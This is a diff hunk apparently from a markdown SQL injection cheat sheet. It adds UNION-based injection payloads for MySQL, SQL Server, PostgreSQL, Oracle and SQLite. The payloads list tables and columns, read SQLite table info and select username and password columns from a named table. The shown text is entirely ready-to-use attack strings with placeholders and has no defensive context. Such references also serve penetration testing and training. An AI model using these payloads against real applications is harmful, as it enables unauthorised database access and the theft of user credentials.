@@ -21,14 +21,18 @@
 ```
 ● MySQL / Microsoft SQL Server  : ' UNION SELECT table_name FROM information_schema.tables-- (if column count more than one put NULL after table_name)
   / PostgreSQL                    ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='put_table_name_here'--
-                                  
+                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
+
 ● Oracle                        : ' UNION SELECT table_name FROM all_tables-- (if column count more than one, put NULL after table_name)
                                   ' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'put_table_name_here'--
+                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
 
 ● SQLite                        : ' UNION SELECT name FROM sqlite_schema WHERE type = 'table'--
                                   ' UNION SELECT name FROM sqlite_schema WHERE type = 'table' AND name NOT LIKE 'sqlite_%'--
                                     (it filters out SQLite's internal metadata tables)
+                                  ' UNION SELECT name FROM pragma_table_info('put_table_name_here')--
+                                  ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
 ```
-
+####
 
 
